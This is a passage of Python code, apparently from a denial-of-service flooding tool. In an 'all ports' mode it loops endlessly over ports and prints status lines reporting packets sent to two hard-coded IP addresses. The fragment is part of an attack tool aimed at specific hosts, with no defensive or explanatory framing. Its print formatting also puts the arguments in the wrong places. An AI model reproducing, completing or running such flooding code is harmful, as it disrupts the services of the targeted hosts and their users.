...
if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1
                print('\033[32;1m[%s]Sented %s packets to 103.215.51.90 through port:All\033[0m'%(sent, dtime))
                print('\033[32;1m[%s]Sented %s packets to 103.215.51.91 through port:All\033[0m'%(sent, dtime))
